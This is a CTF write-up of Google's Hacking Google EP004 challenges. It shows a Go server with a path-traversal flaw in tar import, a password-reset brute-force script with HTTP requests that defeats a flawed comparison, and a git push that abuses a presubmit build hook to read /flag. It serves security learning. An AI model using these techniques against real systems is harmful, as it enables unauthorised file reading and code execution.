---
description: "My writeup for EP004 of the Hacking Google CTF : Bug Hunters."
authors:
  - techbrunch
date: 2022-10-30
tags:
  - CTF
categories:
  - WriteUp
---

# Hacking Google EP004 - Bug Hunters

My writeup for EP004 of the Hacking Google CTF : Bug Hunters.

<!-- more -->

## Challenge 01 - VRP Website

> This endpoint is used by the VRP website to download attachments. It also has a rarely-used endpoint for importing bulk attachments, probably used for backups or migrations. Maybe it contains some bugs?

> Hint: Some of the pages on this version of the website are different, look around for hints about new endpoints.

The challenge is a [clone of Google's Bug Hunting communit's website](https://vrp-website-web.h4ck.ctfcompetition.com/). If we search for "download" we endup on the FAQ page:

> Q: Why did my attachment fail to upload?
> A: To debug, you should call the /import endpoint manually and look at the detailed error message in the response. The same applies to the /export endpoint for downloading attachments from a submission.

https://path-less-traversed-web.h4ck.ctfcompetition.com/import

path-less-traversed -> PATH Traversal

-> only POST allowed
With POST -> missing submission parameter
With submission as query param -> server undergoing migration, import endpoint is temporarily disabled (dry run still enabled)

Max length 255 for submission param

https://path-less-traversed-web.h4ck.ctfcompetition.com/export -> missing submission parameter

With submission -> missing attachment parameter
With attachment -> submission /web-apps/go/a does not exist (try our sample_submission?)

While investigating CH02 I found a reference to:

```html
<p>Thank you for taking the time to consider improving the Google VRP website!</p>
<p>We welcome all contributions, including bug fixes, improvements, documentation updates and style
  suggestions. Read on to see how to get started.</p>
<h2>Getting Started</h2>
<p>First, clone the Git repo for this project:</p>
<pre style=" white-space: pre-line;">
                                                <code>
    $ git clone git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
    $ git checkout -b my-feature
  </code>
```

```go
package main 

import (
	"archive/tar"
	"compress/gzip"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"strings"
)

var addr = ":1337"

func printRequest(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("received request: %+v\n", r)
	w.WriteHeader(http.StatusOK)
}

// exportAttachment exports a tar archive of all attachments for a submission.
// Not implemented very thoroughly yet.
func exportAttachment(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "only GET allowed", http.StatusMethodNotAllowed)
		return
	}

	submission := r.URL.Query().Get("submission")
	if submission == "" {
		http.Error(w, "missing submission parameter", http.StatusBadRequest)
		return
	}

	attachment := r.URL.Query().Get("attachment")
	if attachment == "" {
		http.Error(w, "missing attachment parameter", http.StatusBadRequest)
		return
	}

	// Get the directory where our binary is.
	ex, err := os.Executable()
	if err != nil {
		fmt.Println(err)
		http.Error(w, "error getting the current directory", http.StatusInternalServerError)
		return
	}
	basepath := filepath.Dir(ex)

	// Check if this path exists.
	submissionPath := path.Join(basepath, filepath.Base(submission))
	_, err = os.Stat(submissionPath)
	exists := err == nil || !os.IsNotExist(err)
	if !exists {
		fmt.Println(err)
		http.Error(w, fmt.Sprintf("submission %v does not exist (try our sample_submission?)", submissionPath), http.StatusPaymentRequired)
		return
	}
	attachmentPath := path.Join(submissionPath, "attachments", filepath.Base(attachment))
	_, err = os.Stat(attachmentPath)
	exists = err == nil || !os.IsNotExist(err)
	if !exists {
		fmt.Println(err)
		http.Error(w, fmt.Sprintf("attachment %v does not exist", attachmentPath), http.StatusPaymentRequired)
		return
	}

	// Serve the file.
	http.ServeFile(w, r, attachmentPath)
}

// importAttachments imports a tar archive of attachments for a submission.
func importAttachments(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	submission := r.URL.Query().Get("submission")
	if submission == "" {
		http.Error(w, "missing submission parameter", http.StatusBadRequest)
		return
	}

	// Allow a dry run to test the endpoint.
	dryRun := r.URL.Query().Get("dryRun") != ""

	// TODO: Remove this before deploying to prod!
	debug := r.URL.Query().Get("debug") != ""

	// Read the archive from the request.
	r.ParseMultipartForm(32 << 20) // Limit max input length
	file, header, err := r.FormFile("attachments")
	if err != nil {
		http.Error(w, fmt.Sprintf("could not open file %v: %v", file, err), http.StatusBadRequest)
		return
	}
	defer file.Close()

	filename := filepath.Base(header.Filename)

	// Open with gzip and tar.
	in, err := gzip.NewReader(file)
	if err != nil {
		http.Error(w, fmt.Sprintf("could not open file %v with gzip: %v", filename, err), http.StatusBadRequest)
		return
	}
	tr := tar.NewReader(in)

	// Parse the .tar.gz file.
	for {
		var err error

		// Read until the EOF chunk.
		h, err := tr.Next()
		if err != nil {
			if err == io.EOF {
				break
			}
			http.Error(w, fmt.Sprintf("error reading tar entry: %v", err), http.StatusBadRequest)
			return
		}

		// Skip directories.
		if h.FileInfo().IsDir() {
			fmt.Printf("skipping directory %v in archive\n", h.Name)
			continue
		}

		// Check if the file already exists. If so, show a diff.
		attachmentPath := path.Join(submission, h.Name)
		info, err := os.Stat(attachmentPath)
		if err != nil {
			fmt.Fprintf(w, "new file: %v\n", attachmentPath)
			continue
		}

		// File already exists.
		if !info.Mode().IsRegular() {
			fmt.Fprintf(w, "skipping non-regular file attachment %v\n", attachmentPath)
			continue
		}
		fmt.Fprintf(w, "WARNING: file %v already exists and would get overwritten (enable debug to see differences)\n", attachmentPath)

		// Read the archive file.
		trContents, err := ioutil.ReadAll(tr)
		if err != nil {
			http.Error(w, fmt.Sprintf("error reading uploaded attachment %v: %v", h.Name, err), http.StatusBadRequest)
			return
		}

		// TODO: Remove this before deploying to prod!
		if debug {
			trString := string(trContents)

			existingContents, err := ioutil.ReadFile(attachmentPath)
			if err != nil {
				http.Error(w, fmt.Sprintf("error reading existing file %v: %v", attachmentPath, err), http.StatusBadRequest)
				return
			}
			existingString := string(existingContents)

			if strings.Compare(trString, existingString) == 0 {
				fmt.Fprintf(w, "no differences\n")
				continue
			}

			msg := "showing existing and new contents:\n"
			msg += "=====\n"
			for _, line := range strings.Split(strings.ReplaceAll(existingString, "\r\n", "\n"), "\n") {
				msg += fmt.Sprintf("< %s\n", line)
			}
			msg += "-----\n"
			for _, line := range strings.Split(strings.ReplaceAll(trString, "\r\n", "\n"), "\n") {
				msg += fmt.Sprintf("> %s\n", line)
			}
			msg += "=====\n"
			fmt.Fprintf(w, "%s\n", msg)

			// Debug mode, so just continue without writing the file.
			continue
		}

		// Write the new file.
		os.WriteFile(attachmentPath, trContents, 0660)
	}
}

// Handler for the import/export attachments endpoints
func main() {
	http.HandleFunc("/", printRequest)
	http.HandleFunc("/export", exportAttachment)
	http.HandleFunc("/import", importAttachments)

	fmt.Printf("listening on %v\n", addr)
	http.ListenAndServe(addr, nil)
}

```

```
touch flag
tar czvf flag.tar.gz flag
```

```
❯ http --form POST http://path-less-traversed-web.h4ck.ctfcompetition.com/import\?submission\=./\&dryRun\=1\&debug\=1 attachments@flag.tar.gz --proxy=http:http://127.0.0.1:8080 --verify=no
HTTP/1.1 200 OK
Connection: close
Content-Length: 212
Content-Type: text/plain; charset=utf-8
Date: Sat, 08 Oct 2022 22:23:27 GMT
Via: 1.1 google

WARNING: file flag already exists and would get overwritten (enable debug to see differences)
showing existing and new contents:
=====
< https://h4ck1ng.google/solve/TakingThePathLessTraversed
<
-----
>
=====
```

## Challenge 02 - Attachments Project

> You are the researcher. Follow the hints, find a vulnerability in the platform.

> Hint: Try logging in as tin

-> Running the app
-> The safeEqual check that int from 0 to 28 are at the same index for both password
-> Solution making sure that the digest does not contain any (on average need to reset the password 85 times)
-> Find an ascii password that respect the same constraint

```javascript
const crypto = require('crypto')

function hasNumber(myString) {
  return /\d/.test(myString);
}

let tab = [];
for (let i = 0; i < 100; i++) {
  let cpt = 0;
  while (true) {
    let password = crypto.randomBytes(8).toString('hex')
    let hashedPassword = crypto.createHash('sha1').update(password).digest('base64')
    cpt++
    if (!hasNumber(hashedPassword)) {
      console.log(cpt)
      console.log(password)
      console.log(hashedPassword)
      break;
    }
  }
  tab.push(cpt);
}
const average = tab.reduce((a, b) => a + b, 0) / tab.length;
console.log(average)
```

Automate using stepper:

```
POST /login HTTP/2
Host: vrp-website-web.h4ck.ctfcompetition.com
Content-Length: 32
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
X-Stepper-Execute-Before: reset
Origin: https://vrp-website-web.h4ck.ctfcompetition.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://vrp-website-web.h4ck.ctfcompetition.com/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=tin&password=Wgh1MVHD3R
```

```
HTTP/2 302 Found
X-Powered-By: Express
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRpbiIsImlhdCI6MTY2NTMzNjk5OH0.Ziela1Eg8szIEzcd6rb7wRCfMwsHEELyBWH8bHkqhSM; Path=/
Location: /
Vary: Accept
Content-Type: text/html; charset=utf-8
Content-Length: 46
Date: Sun, 09 Oct 2022 17:36:38 GMT
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<p>Found. Redirecting to <a href="/">/</a></p>
```

```
               <div _ngcontent-jqt-c86="" class="intro-text mat-body-2 ng-star-inserted" style="color: #000000;">
                  Welcome <b>tin</b>!
                  Here is your flag: <a href="https://h4ck1ng.google/solve/all_equals_are_equal_but_some_equals_are_more_equal_than_others" target="_blank" style="color: #222;">https://h4ck1ng.google/solve/all_equals_are_equal_but_some_equals_are_more_equal_than_others</a>.
                </div>
```

## Challenge 03 - Git Hooks

> The VRP platform is proudly open-source, and encourages submissions. Let's try to change something and see if we can find some bugs.

> Hint: Look around the site to find out how to contribute.

```html
<p>After you make your changes, push them up to create a Pull Request:</p>
<pre style=" white-space: pre-line;">
                                                <code>
    $ git push
  </code>
                                              </pre>
<p>You will get back a link to your proposal where a member of the team will review your changes for
  conformance and make any comments.</p>
```

```
❯ git push origin test
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 10 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 253 bytes | 253.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: Skipping presubmit (enable via push option)
remote: Thank you for your interest, but we are no longer accepting proposals
To git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
 ! [remote rejected] test -> test (pre-receive hook declined)
error: failed to push some refs to 'git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo'
```

```
❯ git push origin new  --push-option=presubmit
Enumerating objects: 7, done.
Counting objects: 100% (7/7), done.
Delta compression using up to 10 threads
Compressing objects: 100% (4/4), done.
Writing objects: 100% (5/5), 530 bytes | 176.00 KiB/s, done.
Total 5 (delta 2), reused 0 (delta 0), pack-reused 0
remote: Starting presubmit check
remote: Cloning into 'tmprepo'...
remote: done.
remote: HEAD is now at db8bef4
remote: Building version v0.1.1
remote: ./build.sh: line 5: go: command not found
remote: Build server must be misconfigured again...
remote: Thank you for your interest, but we are no longer accepting proposals
To git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
 ! [remote rejected] new -> new (pre-receive hook declined)
error: failed to push some refs to 'git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo'
```

```bash
#!/usr/bin/env bash

# IMPORTANT: Make sure to bump this before pushing a new binary.
VERSION="$(cat /flag)"
COMMIT_HASH="$(git rev-parse --short HEAD)"
BUILD_TIMESTAMP=$(date '+%Y-%m-%dT%H:%M:%S')

LDFLAGS=(
  "-X 'main.Version=${VERSION}'"
  "-X 'main.CommitHash=${COMMIT_HASH}'"
  "-X 'main.BuildTime=${BUILD_TIMESTAMP}'"
)
```

```
❯ git push origin new  --push-option=presubmit
Enumerating objects: 19, done.
Counting objects: 100% (19/19), done.
Delta compression using up to 10 threads
Compressing objects: 100% (14/14), done.
Writing objects: 100% (15/15), 1.52 KiB | 311.00 KiB/s, done.
Total 15 (delta 8), reused 0 (delta 0), pack-reused 0
remote: Starting presubmit check
remote: Cloning into 'tmprepo'...
remote: done.
remote: HEAD is now at 574edf3 get flag take 3
remote: Building version https://h4ck1ng.google/solve/CIOnPushIsJustRCEAsAService
remote: ./build.sh: line 5: go: command not found
remote: Build server must be misconfigured again...
remote: Thank you for your interest, but we are no longer accepting proposals
To git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
 ! [remote rejected] new -> new (pre-receive hook declined)
error: failed to push some refs to 'git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo'
```